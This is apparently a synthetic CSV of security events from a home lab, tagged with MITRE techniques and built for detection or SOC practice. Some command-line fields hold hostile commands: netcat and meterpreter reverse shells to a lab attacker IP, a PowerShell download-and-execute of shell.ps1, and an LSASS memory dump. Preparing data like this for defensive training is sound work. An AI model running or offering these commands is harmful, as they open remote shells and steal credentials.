access_type,action,action_taken,agent_ip,agent_name,attachment,attacker_host,attempt_count,bytes_sent,bytes_transferred,cloud_provider,command,command_line,destination_domain,destination_host,destination_ip,destination_port,dns_query,encryption_type,event_code,event_type,failure_reason,file_hash,file_path,files_affected,host,image,indicator,injection_type,lab_attack,lab_note,log_source,login_location_1,login_location_2,logon_type,malware_name,mitre_technique,parent_process,ports_scanned,privileges_assigned,process,process_id,protocol,query_count,query_type,recipient,registry_key,resource,rule_name,scan_type,sender,service_name,severity,signature,signature_id,signed,source_host,source_ip,source_process,subject,target_ip,target_process,time_difference_minutes,timestamp,tool,user,value,wazuh_rule_desc,wazuh_rule_id
,AssumeRole,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,ec2:sg-12345,,,,,High,,,,,,,,,,,2026-04-24T01:29:37.667895,,temp.analyst,,,
,,,,,,KALI-LAB-01,280,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T08:20:37.661568,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,45.67.22.10,,,,,,2026-04-22T21:58:37.660531,,temp.analyst,,,
,,,,,,,,6564440,,,,,cobalt-beacon[.]onion,,91.234.56.78,443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T07:38:37.666471,,,,,
,,,,,,,,,,,powershell -nop -w hidden -c IEX,,,,,,,,4104,PowerShell Execution,,,,,WIN-PRAHARSH-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T07:02:37.664537,,john.doe,,,
,,,,,,,,,,Azure AD,,,,,,,,,,Impossible Travel,,,,,,,,,,,Azure AD / Okta,Germany,Russia,,,T1078.004,,,,,,,,,,,,,,,,High,,,,,,,,,,12,2026-04-22T08:33:37.668011,,svc.backup,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,mimikatz.exe,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-23T16:12:37.667167,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Users\Public\payload.dll,,,,,Sysmon,,,,,T1055.001,,,,certutil.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-24T05:31:37.663730,,,,,
,AssumeRole,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,s3:bucket/sensitive-data,,,,,High,,,,,,,,,,,2026-04-21T04:32:37.667868,,temp.analyst,,,
,,,,,,KALI-LAB-01,233,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T22:34:37.661579,Hydra,lab.administrator,,,
,CreateAccessKey,,,,,,,,,Azure,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,s3:bucket/sensitive-data,,,,,High,,,,,,,,,,,2026-04-20T19:16:37.667971,,temp.analyst,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,comsvcs.dll,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-24T07:40:37.667163,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,wmic.exe,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,High,,,,,,,,,,,2026-04-22T05:52:37.664047,,,C:\Windows\Temp\backdoor.exe,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,ELK-SERVER-01,,,Process Hollowing,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,certutil.exe,,,svchost.exe,,2026-04-24T01:06:37.667539,,,,,
,,,,,,,278,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T19:47:37.662616,Hydra,root,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Users\Public\payload.dll,,,,,Sysmon,,,,,T1055.001,,,,certutil.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-22T19:44:37.663738,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.105,,,,,,2026-04-24T11:07:37.661025,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Windows\Temp\malicious.dll,,,,,Sysmon,,,,,T1055.001,,,,bitsadmin.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-22T10:57:37.663785,,,,,
,,,,,,KALI-LAB-01,174,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T14:39:37.661571,Hydra,lab.administrator,,,
,,,,,,,,,,,powershell -c (New-Object Net.WebClient).DownloadFile,,,,,,,,4104,PowerShell Execution,,,,,WAZUH-MANAGER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T12:16:37.664445,,temp.analyst,,,
,,,,,,,,,,,,,,DEV-SERVER-01,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-20T08:32:37.665750,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,23.129.64.100,,,,,,2026-04-20T03:36:37.659818,,finance.user,,,
,,,,,,,,,,,,,,,91.234.56.78,8080,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,bitsadmin.exe,,,,,,,,,,,,High,,,,,192.168.56.105,,,,,,2026-04-22T18:04:37.663699,,temp.analyst,,,
,,,,,,,,,,,,cmd.exe /c nc.exe 192.168.56.104 4444 -e cmd.exe,,,192.168.56.104,4445,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T16:37:37.664373,Metasploit / Netcat,lab.administrator,,,
,,,,,invoice.xlsm,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,jane.smith@praharsh-lab.local,,,,,it-helpdesk@micr0soft[.]com,,High,,,,,,,Your account has been compromised,,,,2026-04-23T08:59:37.669038,,,,,
,,,,,,,,,,,,procdump.exe -ma lsass.exe lsass.dmp,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,meterpreter.exe,7691,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-19T19:00:37.663308,,praharsh.admin,,,
,,,,,,,,4773959,,,,,phish-praharsh-lab[.]xyz,,77.73.133.84,443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-20T06:05:37.666276,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,WAZUH-MANAGER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-21T00:14:37.659651,,dev.engineer,,,
,,,,,,,77,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T20:07:37.662452,Hydra,root,,,
,,,,,,,,,,,,powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.104:8080/shell.ps1'),,,192.168.56.104,4445,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T18:44:37.664208,Metasploit / Netcat,svc.backup,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,SPLUNK-VM-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.103,,,,,,2026-04-23T04:51:37.660158,,temp.analyst,,,
,,,,,,,,,,,powershell -c (New-Object Net.WebClient).DownloadFile,,,,,,,,4104,PowerShell Execution,,,,,ELK-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T20:09:37.664476,,praharsh.admin,,,
,,,,,,,,2547997,,,,,evil-c2[.]com,,91.234.56.78,8443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-24T03:56:37.666416,,,,,
,,,,,,,,,,,,,,,185.220.101.45,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Medium,ET MALWARE CobaltStrike Beacon,2965476,,,192.168.56.105,,,,,,2026-04-24T01:26:37.668708,,,,,
,,Detected,,,,,,,,,,,,,,,,,,Malware Detected,,0123456789abcdef0123456789abcdef,C:\Windows\Temp\payload.dll,,DEV-SERVER-01,,,,,,Windows Defender / Wazuh,,,,Cobalt.Strike.Beacon,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T22:58:37.667389,,,,,
,,,,,,,282,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T13:02:37.662651,Hydra,ubuntu,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T01:13:37.663167,,dev.engineer,,,
,,,,,,,,,,,,,,,185.220.101.45,8080,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,msiexec.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-21T09:35:37.663441,,svc.backup,,,
,,,,,,,41,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T05:22:37.661763,Hydra / CrackMapExec,lab.administrator,,,
,,,,,,,,,,,,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444,,,192.168.56.104,4445,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-20T10:06:37.664290,Metasploit / Netcat,john.doe,,,
,,,,,reset_password.html,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,praharsh.admin@praharsh-lab.local,,,,,ceo@company-update[.]net,,High,,,,,,,Your account has been compromised,,,,2026-04-19T15:30:37.669057,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.101,,,,,,2026-04-23T04:52:37.660822,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\ProgramData\malware.bat,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,rundll32.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-22T01:19:37.663909,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,FIN-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.15,,,,,,2026-04-22T15:23:37.660017,,temp.analyst,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.102,23,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-RDP,,,,Low,,,,,185.220.101.45,,,,,,2026-04-24T13:42:37.668543,,,,,
,,,,,,,88,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T06:39:37.662318,Hydra / CrackMapExec,svc.backup,,,
,,,,,,,137,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T12:18:37.662608,Hydra,ubuntu,,,
,,,,,,,,,,,,,,,,,aGVsbG8.mimikatz-payload[.]ru,,,DNS Tunneling Detected,,,,,WAZUH-MANAGER-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,127,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-23T05:05:37.666692,,,,,
,,,,,,,,,,,,cmd.exe /c nc.exe 192.168.56.104 4444 -e cmd.exe,,,192.168.56.104,4444,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T09:03:37.664250,Metasploit / Netcat,attacker,,,
,,,,,,KALI-LAB-01,463,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T17:18:37.661685,Hydra,lab.administrator,,,
,,,,,,,,3029995,,,,,malware-drop[.]net,,192.168.56.104,443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T12:07:37.666210,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,SPLUNK-VM-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-23T13:37:37.660042,,attacker,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,SPLUNK-VM-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,172.16.0.100,,,,,,2026-04-23T05:11:37.660722,,svc.backup,,,
,,,,,,,,,,,,"mshta vbscript:Execute(""CreateObject(""Wscript.Shell"").Run"")",,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,regsvr32.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T20:07:37.664891,,john.doe,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,ELK-SERVER-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,172.16.0.100,,,,,,2026-04-21T23:25:37.661311,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,FIN-SERVER-01,,,,True,,Windows Security,,,,,T1068,,,SeDebugPrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T02:39:37.665327,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,SPLUNK-VM-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.15,,,,,,2026-04-24T14:45:37.660634,,john.doe,,,
,,,,,,,,,58631590,,,,,,23.129.64.100,,,,,Data Exfiltration Suspected,,,,,ELK-SERVER-01,,,,,,Firewall,,,,,T1048,,,,,,FTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T09:23:37.666812,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Users\Public\shell.ps1,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,rundll32.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-20T01:12:37.663956,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\ProgramData\malware.bat,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,bitsadmin.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-23T01:57:37.663989,,dev.engineer,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WAZUH-MANAGER-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.10,,,,,,2026-04-20T12:41:37.660749,,finance.user,,,
,,,,,,,,,,,,,,FIN-SERVER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,WIN-DC-PRAHARSH,192.168.56.101,,,,,,2026-04-21T03:47:37.665700,,dev.engineer,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,DEV-SERVER-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.105,,,,,,2026-04-24T05:25:37.661293,,jane.smith,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,a1b2c3d4e5f6789012345678abcdef01,C:\Users\praharsh.admin\Downloads\invoice.exe,,SPLUNK-VM-01,,,,,,Windows Defender / Wazuh,,,,Cobalt.Strike.Beacon,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T16:22:37.667428,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,WIN-PRAHARSH-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,194.165.16.11,,,,,,2026-04-20T10:17:37.660006,,finance.user,,,
,,,192.168.56.103,SPLUNK-VM-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T00:18:37.669537,,,,Multiple failed SSH logins,40101
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,WAZUH-MANAGER-01,,,,True,,Windows Security,,,,,T1068,,,SeImpersonatePrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T05:49:37.665303,,john.doe,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,comsvcs.dll,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-22T10:49:37.667117,,lab.administrator,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.10,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-C2-Ports,,,,Low,,,,,91.234.56.78,,,,,,2026-04-21T05:40:37.668309,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,WIN-PRAHARSH-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-21T17:54:37.660439,,lab.administrator,,,
,,,,,,,,548653,,,,,evil-c2[.]com,,103.45.78.21,1337,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-20T08:16:37.666191,,,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.105,3389,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-RDP,,,,Low,,,,,185.220.101.45,,,,,,2026-04-21T17:54:37.668607,,,,,
,,,,,,,,6985600,,,,,evil-c2[.]com,,91.234.56.78,8080,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T02:14:37.666405,,,,,
,,,,,,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,jane.smith@praharsh-lab.local,,,,,it-helpdesk@micr0soft[.]com,,High,,,,,,,ACTION REQUIRED: Verify your identity,,,,2026-04-23T22:36:37.669172,,,,,
,,,,,,,233,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T15:54:37.662190,Hydra / CrackMapExec,dev.engineer,,,
,,,,,,KALI-LAB-01,244,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T21:32:37.661440,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,DEV-SERVER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,WIN-PRAHARSH-01,10.0.2.10,,,,,,2026-04-22T11:52:37.665492,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,ELK-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.15,,,,,,2026-04-21T18:38:37.660491,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,WAZUH-MANAGER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.101,,,,,,2026-04-23T01:20:37.660409,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,50066,,,,,,,,,,,SYN Scan,,,Medium,,,,,192.168.56.104,,,192.168.56.105,,,2026-04-21T16:01:37.665027,Nmap,,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.105,1433,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-RDP,,,,Low,,,,,192.168.56.104,,,,,,2026-04-23T22:58:37.668419,,,,,
